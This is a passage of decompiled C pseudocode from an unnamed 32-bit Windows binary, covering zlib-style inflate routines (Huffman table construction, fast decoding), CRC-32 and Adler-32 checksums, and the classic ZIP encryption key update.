                           (*(uint *)((int)this + 4) >> 5 & 0x1f) + 1,*(void **)((int)this + 0xc),
                           &local_14,(int *)&local_18,&local_8,&local_4,*(int *)((int)this + 0x24));
      if (iVar9 != 0) {
        if (iVar9 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        param_1 = iVar9;
        goto LAB_00406b70;
      }
      puVar8 = (undefined4 *)(*(code *)in_EAX[8])(in_EAX[10],1,0x1a);
      if (puVar8 == (undefined4 *)0x0) {
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_00406260(-4);
        return;
      }
      *(undefined *)(puVar8 + 4) = (undefined)local_14;
      *(undefined *)((int)puVar8 + 0x11) = local_18._0_1_;
      *puVar8 = 0;
      *(int *)((int)puVar8 + 0x12) = local_8;
      *(int *)((int)puVar8 + 0x16) = local_4;
      *(undefined4 **)((int)this + 4) = puVar8;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
      *(undefined4 *)this = 6;
switchD_00406b94_caseD_407194:
      *(uint *)((int)this + 0x20) = local_28;
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
      pbVar4 = *in_EAX;
      *in_EAX = _Src;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar4);
      *(byte **)((int)this + 0x34) = pbVar3;
      iVar9 = FUN_00406390(this,param_1);
      if (iVar9 != 1) {
        FUN_00406260(iVar9);
        return;
      }
      param_1 = 0;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 4));
      uVar5 = *(uint *)((int)this + 0x20);
      local_24 = *(byte **)((int)this + 0x34);
      local_20 = in_EAX[1];
      _Src = *in_EAX;
      uVar12 = *(uint *)((int)this + 0x1c);
      if (local_24 < *(byte **)((int)this + 0x30)) {
        local_18 = *(byte **)((int)this + 0x30) + (-1 - (int)local_24);
      }
      else {
        local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_24);
      }
      local_28 = uVar5;
      if (*(int *)((int)this + 0x18) != 0) {
        *(undefined4 *)this = 7;
switchD_00406b94_caseD_40748a:
        *(byte **)((int)this + 0x34) = local_24;
        param_1 = FUN_00406260(param_1);
        local_24 = *(byte **)((int)this + 0x34);
        if (*(byte **)((int)this + 0x30) == local_24) {
          *(undefined4 *)this = 8;
switchD_00406b94_caseD_4074c7:
          *(uint *)((int)this + 0x20) = local_28;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = local_20;
          in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
          *in_EAX = _Src;
          *(byte **)((int)this + 0x34) = local_24;
          FUN_00406260(1);
          return;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        goto LAB_00406b70;
      }
      *(undefined4 *)this = 0;
      break;
    case (undefined *)0x406f44:
      goto switchD_00406b94_caseD_406f44;
    case (undefined *)0x407194:
      goto switchD_00406b94_caseD_407194;
    case (undefined *)0x4072c0:
switchD_00406b94_caseD_4072c0:
      *(uint *)((int)this + 0x20) = local_28;
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
      *in_EAX = _Src;
      *(byte **)((int)this + 0x34) = pbVar3;
      FUN_00406260(-3);
      return;
    case (undefined *)0x40748a:
      goto switchD_00406b94_caseD_40748a;
    case (undefined *)0x4074c7:
      goto switchD_00406b94_caseD_4074c7;
    }
                    // WARNING: Load size is inaccurate
    uVar11 = *this;
    pbVar3 = local_24;
    uVar6 = uVar5;
    uVar5 = local_28;
  } while( true );
LAB_00407298:
  *(uint *)((int)this + 0x20) = local_28;
  *(uint *)((int)this + 0x1c) = uVar12;
  in_EAX[1] = (byte *)0x0;
  goto LAB_00406b70;
}



undefined4 FUN_00407540(void)

{
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[10]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[9]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28));
  return 0;
}



undefined4 __thiscall
FUN_004075d0(void *this,uint param_1,uint param_2,int param_3,int param_4,int *param_5,int param_6,
            uint *param_7,uint *param_8)

{
  uint uVar1;
  undefined3 uVar2;
  undefined4 uVar3;
  uint *puVar4;
  uint *in_EAX;
  int *piVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  uint uVar12;
  undefined4 *puVar13;
  char cVar14;
  uint uVar15;
  int iVar16;
  uint uVar17;
  int iVar18;
  byte bVar19;
  int iVar20;
  uint local_fc;
  uint *local_f8;
  uint local_f4;
  uint local_f0;
  uint *local_ec;
  uint local_e4;
  undefined4 local_dc;
  uint local_d8;
  int local_d4;
  int local_d0;
  int local_c8;
  uint local_c0 [16];
  uint local_80 [16];
  int aiStack_40 [16];
  
  local_c0[0] = 0;
  local_c0[1] = 0;
  local_c0[2] = 0;
  local_c0[3] = 0;
  local_c0[4] = 0;
  local_c0[5] = 0;
  local_c0[6] = 0;
  local_c0[7] = 0;
  local_c0[8] = 0;
  local_c0[9] = 0;
  local_c0[10] = 0;
  local_c0[11] = 0;
  local_c0[12] = 0;
  local_c0[13] = 0;
  local_c0[14] = 0;
  local_c0[15] = 0;
  piVar5 = (int *)this;
  uVar15 = param_1;
  do {
    local_c0[*piVar5] = local_c0[*piVar5] + 1;
    piVar5 = piVar5 + 1;
    uVar15 = uVar15 - 1;
  } while (uVar15 != 0);
  if (local_c0[0] == param_1) {
    *param_5 = 0;
    *in_EAX = 0;
  }
  else {
    local_f0 = 1;
    do {
      if (local_c0[local_f0] != 0) break;
      local_f0 = local_f0 + 1;
    } while (local_f0 < 0x10);
    local_fc = *in_EAX;
    if (*in_EAX < local_f0) {
      local_fc = local_f0;
    }
    uVar15 = 0xf;
    do {
      if (local_c0[uVar15] != 0) break;
      uVar15 = uVar15 - 1;
    } while (uVar15 != 0);
    if (uVar15 < local_fc) {
      local_fc = uVar15;
    }
    *in_EAX = local_fc;
    iVar20 = 1 << ((byte)local_f0 & 0x1f);
    for (uVar9 = local_f0; uVar9 < uVar15; uVar9 = uVar9 + 1) {
      if ((int)(iVar20 - local_c0[uVar9]) < 0) {
        return 0xfffffffd;
      }
      iVar20 = (iVar20 - local_c0[uVar9]) * 2;
    }
    iVar20 = iVar20 - local_c0[uVar15];
    if (iVar20 < 0) {
      return 0xfffffffd;
    }
    local_c0[uVar15] = local_c0[uVar15] + iVar20;
    iVar10 = 0;
    iVar16 = uVar15 - 1;
    local_80[1] = 0;
    if (iVar16 != 0) {
      iVar18 = 0;
      do {
        iVar10 = iVar10 + *(int *)((int)local_c0 + iVar18 + 4);
        iVar16 = iVar16 + -1;
        *(int *)((int)local_80 + iVar18 + 8) = iVar10;
        iVar18 = iVar18 + 4;
      } while (iVar16 != 0);
    }
    uVar9 = 0;
    do {
                    // WARNING: Load size is inaccurate
      iVar10 = *this;
      this = (void *)((int)this + 4);
      if (iVar10 != 0) {
        uVar8 = local_80[iVar10];
        param_8[uVar8] = uVar9;
        local_80[iVar10] = uVar8 + 1;
      }
      uVar9 = uVar9 + 1;
    } while (uVar9 < param_1);
    uVar9 = local_80[uVar15];
    iVar16 = -1;
    iVar10 = -local_fc;
    local_e4 = 0;
    local_80[0] = 0;
    local_ec = param_8;
    aiStack_40[1] = 0;
    local_c8 = 0;
    local_f4 = 0;
    if ((int)local_f0 <= (int)uVar15) {
      local_d0 = local_f0 - 1;
      local_f8 = local_c0 + local_f0;
      do {
        uVar8 = *local_f8;
        uVar3 = local_dc;
        while (local_dc = uVar3, uVar8 != 0) {
          local_dc._2_2_ = (undefined2)((uint)uVar3 >> 0x10);
          uVar1 = uVar8 - 1;
          local_d4 = iVar10 + local_fc;
          if (local_d4 < (int)local_f0) {
            iVar11 = iVar10 - local_fc;
            iVar18 = iVar16;
            do {
              local_d4 = local_d4 + local_fc;
              iVar10 = iVar10 + local_fc;
              iVar16 = iVar18 + 1;
              iVar11 = iVar11 + local_fc;
              uVar17 = uVar15 - iVar10;
              if (local_fc < uVar15 - iVar10) {
                uVar17 = local_fc;
              }
              uVar12 = local_f0 - iVar10;
              uVar6 = 1 << ((byte)uVar12 & 0x1f);
              if ((uVar8 < uVar6) &&
                 (iVar7 = uVar6 + (-1 - uVar1), puVar4 = local_f8, uVar12 < uVar17)) {
                while (uVar12 = uVar12 + 1, uVar12 < uVar17) {
                  if ((uint)(iVar7 * 2) <= puVar4[1]) break;
                  iVar7 = iVar7 * 2 - puVar4[1];
                  puVar4 = puVar4 + 1;
                }
              }
              local_f4 = 1 << ((byte)uVar12 & 0x1f);
              uVar17 = local_f4 + *param_7;
              if (0x5a0 < uVar17) {
                return 0xfffffffd;
              }
              local_c8 = param_6 + *param_7 * 8;
              aiStack_40[iVar18 + 2] = local_c8;
              *param_7 = uVar17;
              if (iVar16 == 0) {
                *param_5 = local_c8;
              }
              else {
                local_80[iVar16] = local_e4;
                uVar17 = local_e4 >> ((byte)iVar11 & 0x1f);
                iVar18 = aiStack_40[iVar16];
                local_d8 = (local_c8 - iVar18 >> 3) - uVar17;
                *(undefined4 *)(iVar18 + uVar17 * 8) = local_dc;
                *(uint *)(iVar18 + 4 + uVar17 * 8) = local_d8;
              }
              iVar18 = iVar16;
            } while (local_d4 < (int)local_f0);
          }
          bVar19 = (byte)iVar10;
          uVar2 = CONCAT21(local_dc._2_2_,(char)local_f0 - bVar19);
          if (local_ec < param_8 + uVar9) {
            local_d8 = *local_ec;
            if (local_d8 < param_2) {
              cVar14 = (-(local_d8 < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar18 = (local_d8 - param_2) * 4;
              local_d8 = *(uint *)(iVar18 + param_3);
              cVar14 = *(char *)(iVar18 + param_4) + 'P';
            }
            local_ec = local_ec + 1;
            local_dc = CONCAT31(uVar2,cVar14);
          }
          else {
            local_dc = CONCAT31(uVar2,0xc0);
          }
          iVar18 = 1 << ((char)local_f0 - bVar19 & 0x1f);
          uVar8 = local_e4 >> (bVar19 & 0x1f);
          if (uVar8 < local_f4) {
            puVar13 = (undefined4 *)(local_c8 + uVar8 * 8);
            do {
              *puVar13 = local_dc;
              puVar13[1] = local_d8;
              uVar8 = uVar8 + iVar18;
              puVar13 = puVar13 + iVar18 * 2;
            } while (uVar8 < local_f4);
          }
          uVar17 = 1 << ((byte)local_d0 & 0x1f);
          uVar8 = local_e4 & uVar17;
          while (uVar8 != 0) {
            local_e4 = local_e4 ^ uVar17;
            uVar17 = uVar17 >> 1;
            uVar8 = local_e4 & uVar17;
          }
          local_e4 = local_e4 ^ uVar17;
          uVar8 = uVar1;
          uVar3 = local_dc;
          if (((1 << (bVar19 & 0x1f)) - 1U & local_e4) != local_80[iVar16]) {
            do {
              iVar10 = iVar10 - local_fc;
              iVar16 = iVar16 + -1;
            } while (((1 << ((byte)iVar10 & 0x1f)) - 1U & local_e4) != local_80[iVar16]);
          }
        }
        local_f8 = local_f8 + 1;
        local_d0 = local_d0 + 1;
        local_f0 = local_f0 + 1;
      } while ((int)local_f0 <= (int)uVar15);
    }
    if ((iVar20 != 0) && (uVar15 != 1)) {
      return 0xfffffffb;
    }
  }
  return 0;
}



int __cdecl FUN_00407a40(void *param_1,int *param_2,int *param_3,int param_4)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x13,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_004075d0(param_1,0x13,0x13,0,0,param_3,param_4,&local_4,puVar1);
  if (iVar2 == -3) {
    *(char **)(unaff_EBX + 0x18) = "oversubscribed dynamic bit lengths tree";
  }
  else if ((iVar2 == -5) || (*param_2 == 0)) {
    *(char **)(unaff_EBX + 0x18) = "incomplete dynamic bit lengths tree";
    iVar2 = -3;
  }
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



int __cdecl
FUN_00407ae0(uint param_1,uint param_2,void *param_3,int *param_4,int *param_5,int *param_6,
            int *param_7,int param_8)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x120,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_004075d0(param_3,param_1,0x101,0x42dc38,0x42dcb8,param_6,param_8,&local_4,puVar1);
  if (iVar2 == 0) {
    if (*param_4 != 0) {
      iVar2 = FUN_004075d0((void *)((int)param_3 + param_1 * 4),param_2,0,0x42dd38,0x42ddb0,param_7,
                           param_8,&local_4,puVar1);
      if (iVar2 == 0) {
        if ((*param_5 != 0) || (param_1 < 0x102)) {
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return 0;
        }
      }
      else {
        if (iVar2 == -3) {
          *(char **)(unaff_EBX + 0x18) = "oversubscribed distance tree";
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -5) {
          *(char **)(unaff_EBX + 0x18) = "incomplete distance tree";
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -4) goto LAB_00407c14;
      }
      *(char **)(unaff_EBX + 0x18) = "empty distance tree with lengths";
      iVar2 = -3;
LAB_00407c14:
      (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
      return iVar2;
    }
  }
  else {
    if (iVar2 == -3) {
      *(char **)(unaff_EBX + 0x18) = "oversubscribed literal/length tree";
      goto LAB_00407c49;
    }
    if (iVar2 == -4) goto LAB_00407c49;
  }
  *(char **)(unaff_EBX + 0x18) = "incomplete literal/length tree";
  iVar2 = -3;
LAB_00407c49:
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



undefined4 __cdecl
FUN_00407c60(int param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  undefined *puVar8;
  uint uVar9;
  uint uVar10;
  byte *pbVar11;
  byte *pbVar12;
  uint uVar13;
  undefined *puVar14;
  uint uVar15;
  undefined *puVar16;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  
  pbVar11 = *param_6;
  local_14 = param_6[1];
  uVar15 = *(uint *)(param_5 + 0x20);
  puVar16 = *(undefined **)(param_5 + 0x34);
  uVar4 = *(uint *)(param_5 + 0x1c);
  if (puVar16 < *(undefined **)(param_5 + 0x30)) {
    local_10 = *(undefined **)(param_5 + 0x30) + (-1 - (int)puVar16);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_5 + 0x2c) - (int)puVar16);
  }
  uVar9 = *(uint *)(&DAT_0042ca48 + param_1 * 4);
  uVar2 = *(uint *)(&DAT_0042ca48 + param_2 * 4);
  local_c = pbVar11;
  do {
    for (; uVar4 < 0x14; uVar4 = uVar4 + 8) {
      bVar1 = *pbVar11;
      local_14 = local_14 + -1;
      pbVar11 = pbVar11 + 1;
      uVar15 = uVar15 | (uint)bVar1 << ((byte)uVar4 & 0x1f);
      local_c = pbVar11;
    }
    bVar1 = *(byte *)(param_3 + (uVar9 & uVar15) * 8);
    uVar10 = (uint)bVar1;
    iVar7 = param_3 + (uVar9 & uVar15) * 8;
    uVar15 = uVar15 >> (*(byte *)(iVar7 + 1) & 0x1f);
    if (uVar10 == 0) {
      uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      *puVar16 = *(undefined *)(iVar7 + 4);
LAB_00407eaf:
      puVar16 = puVar16 + 1;
      local_10 = local_10 + -1;
    }
    else {
      uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      while ((bVar1 & 0x10) == 0) {
        if ((uVar10 & 0x40) != 0) {
          if ((uVar10 & 0x20) != 0) {
            uVar9 = (int)param_6[1] - (int)local_14;
            if (uVar4 >> 3 < (uint)((int)param_6[1] - (int)local_14)) {
              uVar9 = uVar4 >> 3;
            }
            *(uint *)(param_5 + 0x20) = uVar15;
            *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
            param_6[1] = local_14 + uVar9;
            pbVar3 = *param_6;
            *param_6 = pbVar11 + -uVar9;
            param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
            *(undefined **)(param_5 + 0x34) = puVar16;
            return 1;
          }
          param_6[6] = (byte *)0x42e228;
          goto LAB_00407f7d;
        }
        iVar5 = (*(uint *)(&DAT_0042ca48 + uVar10 * 4) & uVar15) + *(int *)(iVar7 + 4);
        bVar1 = *(byte *)(iVar7 + iVar5 * 8);
        uVar10 = (uint)bVar1;
        iVar7 = iVar7 + iVar5 * 8;
        uVar15 = uVar15 >> (*(byte *)(iVar7 + 1) & 0x1f);
        if (uVar10 == 0) {
          uVar4 = uVar4 - *(byte *)(iVar7 + 1);
          *puVar16 = *(undefined *)(iVar7 + 4);
          goto LAB_00407eaf;
        }
        uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      }
      uVar10 = uVar10 & 0xf;
      uVar6 = (*(uint *)(&DAT_0042ca48 + uVar10 * 4) & uVar15) + *(int *)(iVar7 + 4);
      uVar15 = uVar15 >> (sbyte)uVar10;
      for (uVar4 = uVar4 - uVar10; uVar4 < 0xf; uVar4 = uVar4 + 8) {
        bVar1 = *pbVar11;
        local_14 = local_14 + -1;
        pbVar11 = pbVar11 + 1;
        uVar15 = uVar15 | (uint)bVar1 << ((byte)uVar4 & 0x1f);
        local_c = pbVar11;
      }
      pbVar3 = (byte *)(param_4 + (uVar2 & uVar15) * 8);
      uVar15 = uVar15 >> (pbVar3[1] & 0x1f);
      uVar4 = uVar4 - pbVar3[1];
      bVar1 = *pbVar3;
      while ((bVar1 & 0x10) == 0) {
        if ((bVar1 & 0x40) != 0) {
          param_6[6] = (byte *)"invalid distance code";
LAB_00407f7d:
          uVar9 = uVar4 >> 3;
          if ((uint)((int)param_6[1] - (int)local_14) <= uVar4 >> 3) {
            uVar9 = (int)param_6[1] - (int)local_14;
          }
          *(uint *)(param_5 + 0x20) = uVar15;
          *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
          param_6[1] = local_14 + uVar9;
          pbVar3 = *param_6;
          *param_6 = pbVar11 + -uVar9;
          param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
          *(undefined **)(param_5 + 0x34) = puVar16;
          return 0xfffffffd;
        }
        iVar7 = (*(uint *)(&DAT_0042ca48 + (uint)bVar1 * 4) & uVar15) + *(int *)(pbVar3 + 4);
        pbVar12 = pbVar3 + iVar7 * 8;
        pbVar3 = pbVar3 + iVar7 * 8;
        uVar15 = uVar15 >> (pbVar3[1] & 0x1f);
        uVar4 = uVar4 - pbVar3[1];
        bVar1 = *pbVar12;
      }
      uVar10 = bVar1 & 0xf;
      pbVar12 = pbVar11;
      pbVar11 = local_c;
      for (; uVar4 < uVar10; uVar4 = uVar4 + 8) {
        local_14 = local_14 + -1;
        uVar15 = uVar15 | (uint)*pbVar12 << ((byte)uVar4 & 0x1f);
        pbVar12 = pbVar11 + 1;
        pbVar11 = pbVar12;
      }
      uVar13 = *(uint *)(&DAT_0042ca48 + uVar10 * 4) & uVar15;
      uVar15 = uVar15 >> (sbyte)uVar10;
      puVar8 = puVar16 + -(uVar13 + *(int *)(pbVar3 + 4));
      puVar14 = *(undefined **)(param_5 + 0x28);
      uVar4 = uVar4 - uVar10;
      local_10 = local_10 + -uVar6;
      local_c = pbVar11;
      if (puVar8 < puVar14) {
        do {
          puVar8 = puVar8 + (*(int *)(param_5 + 0x2c) - (int)puVar14);
        } while (puVar8 < puVar14);
        uVar10 = *(int *)(param_5 + 0x2c) - (int)puVar8;
        if (uVar10 < uVar6) {
          iVar7 = uVar6 - uVar10;
          do {
            *puVar16 = *puVar8;
            puVar16 = puVar16 + 1;
            puVar8 = puVar8 + 1;
            uVar10 = uVar10 - 1;
          } while (uVar10 != 0);
          puVar14 = *(undefined **)(param_5 + 0x28);
          do {
            *puVar16 = *puVar14;
            puVar16 = puVar16 + 1;
            puVar14 = puVar14 + 1;
            iVar7 = iVar7 + -1;
          } while (iVar7 != 0);
        }
        else {
          *puVar16 = *puVar8;
          puVar16[1] = puVar8[1];
          puVar16 = puVar16 + 2;
          puVar8 = puVar8 + 2;
          iVar7 = uVar6 - 2;
          do {
            *puVar16 = *puVar8;
            puVar16 = puVar16 + 1;
            puVar8 = puVar8 + 1;
            iVar7 = iVar7 + -1;
          } while (iVar7 != 0);
        }
      }
      else {
        *puVar16 = *puVar8;
        puVar16[1] = puVar8[1];
        puVar16 = puVar16 + 2;
        puVar8 = puVar8 + 2;
        iVar7 = uVar6 - 2;
        do {
          *puVar16 = *puVar8;
          puVar16 = puVar16 + 1;
          puVar8 = puVar8 + 1;
          iVar7 = iVar7 + -1;
        } while (iVar7 != 0);
      }
    }
    if ((local_10 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
      uVar9 = (int)param_6[1] - (int)local_14;
      if (uVar4 >> 3 < (uint)((int)param_6[1] - (int)local_14)) {
        uVar9 = uVar4 >> 3;
      }
      *(uint *)(param_5 + 0x20) = uVar15;
      *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
      param_6[1] = local_14 + uVar9;
      pbVar3 = *param_6;
      *param_6 = pbVar11 + -uVar9;
      param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
      *(undefined **)(param_5 + 0x34) = puVar16;
      return 0;
    }
  } while( true );
}



uint __fastcall FUN_00407fd0(byte *param_1,uint param_2)

{
  uint in_EAX;
  uint uVar1;
  uint uVar2;
  
  if (param_1 != (byte *)0x0) {
    uVar1 = ~in_EAX;
    if (7 < param_2) {
      uVar2 = param_2 >> 3;
      do {
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0042de28 + ((*param_1 ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0042de28 + ((param_1[1] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0042de28 + ((param_1[2] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0042de28 + ((param_1[3] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0042de28 + ((param_1[4] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0042de28 + ((param_1[5] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0042de28 + ((param_1[6] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0042de28 + ((param_1[7] ^ uVar1) & 0xff) * 4);
        param_1 = param_1 + 8;
        param_2 = param_2 - 8;
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    for (; param_2 != 0; param_2 = param_2 - 1) {
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0042de28 + ((*param_1 ^ uVar1) & 0xff) * 4);
      param_1 = param_1 + 1;
    }
    return ~uVar1;
  }
  return 0;
}



void __fastcall FUN_004080e0(char param_1,uint *param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_0042de28 + (((int)param_1 ^ *param_2) & 0xff) * 4) ^ *param_2 >> 8;
  *param_2 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_2[1]) * 0x8088405 + 1;
  param_2[1] = uVar1;
  param_2[2] = param_2[2] >> 8 ^
               *(uint *)(&DAT_0042de28 + ((uVar1 >> 0x18 ^ param_2[2]) & 0xff) * 4);
  return;
}



void FUN_00408130(void)

{
  uint uVar1;
  byte in_AL;
  uint uVar2;
  uint *unaff_ESI;
  
  uVar1 = unaff_ESI[2];
  uVar2 = uVar1 & 0xfffd | 2;
  uVar2 = *(uint *)(&DAT_0042de28 +
                   (((int)(char)(in_AL ^ (byte)((uVar2 ^ 1) * uVar2 >> 8)) ^ *unaff_ESI) & 0xff) * 4
                   ) ^ *unaff_ESI >> 8;
  *unaff_ESI = uVar2;
  uVar2 = ((uVar2 & 0xff) + unaff_ESI[1]) * 0x8088405 + 1;
  unaff_ESI[1] = uVar2;
  unaff_ESI[2] = uVar1 >> 8 ^ *(uint *)(&DAT_0042de28 + ((uVar2 >> 0x18 ^ uVar1) & 0xff) * 4);
  return;
}



uint __cdecl FUN_004081a0(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  uint uVar18;
  uint uVar19;
  
  uVar2 = param_1 & 0xffff;
  uVar19 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    return 1;
  }
  if (param_3 != 0) {
    do {
      uVar1 = param_3;
      if (0x15af < param_3) {
        uVar1 = 0x15b0;
      }
      param_3 = param_3 - uVar1;
      if (0xf < (int)uVar1) {
        uVar18 = uVar1 >> 4;
        uVar1 = uVar1 + uVar18 * -0x10;
        do {
          iVar3 = uVar2 + *param_2;
          iVar4 = iVar3 + (uint)param_2[1];
          iVar5 = iVar4 + (uint)param_2[2];
          iVar6 = iVar5 + (uint)param_2[3];
          iVar7 = iVar6 + (uint)param_2[4];
          iVar8 = iVar7 + (uint)param_2[5];
          iVar9 = iVar8 + (uint)param_2[6];
          iVar10 = iVar9 + (uint)param_2[7];
          iVar11 = iVar10 + (uint)param_2[8];
          iVar12 = iVar11 + (uint)param_2[9];
          iVar13 = iVar12 + (uint)param_2[10];
          iVar14 = iVar13 + (uint)param_2[0xb];
          iVar15 = iVar14 + (uint)param_2[0xc];
          iVar16 = iVar15 + (uint)param_2[0xd];
          iVar17 = iVar16 + (uint)param_2[0xe];
          uVar2 = iVar17 + (uint)param_2[0xf];
          uVar19 = uVar19 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11
                   + iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;
          param_2 = param_2 + 0x10;
          uVar18 = uVar18 - 1;
        } while (uVar18 != 0);
      }
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        uVar2 = uVar2 + *param_2;
        param_2 = param_2 + 1;
        uVar19 = uVar19 + uVar2;
      }
      uVar2 = uVar2 % 0xfff1;
      uVar19 = uVar19 % 0xfff1;
    } while (param_3 != 0);
  }
  return uVar19 << 0x10 | uVar2;
}



void __cdecl FUN_004082e0(undefined4 param_1,size_t param_2,size_t param_3)

{
  _calloc(param_2,param_3);
  return;
}



undefined4 FUN_00408310(void)

{
  uint *puVar1;
  int *piVar2;
  int iVar3;
  int unaff_EDI;
  
  if ((unaff_EDI != 0) && (puVar1 = *(uint **)(unaff_EDI + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(unaff_EDI + 0x14) = 0;
    *(undefined4 *)(unaff_EDI + 8) = 0;
    *(undefined4 *)(unaff_EDI + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    piVar2 = *(int **)(*(int *)(unaff_EDI + 0x1c) + 0x14);
    if ((*piVar2 == 4) || (*piVar2 == 5)) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[3]);
    }
    if (*piVar2 == 6) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[1]);
    }
    piVar2[0xd] = piVar2[10];
    piVar2[0xc] = piVar2[10];
    *piVar2 = 0;
    piVar2[7] = 0;
    piVar2[8] = 0;
    if ((code *)piVar2[0xe] != (code *)0x0) {
      iVar3 = (*(code *)piVar2[0xe])(0,0,0);
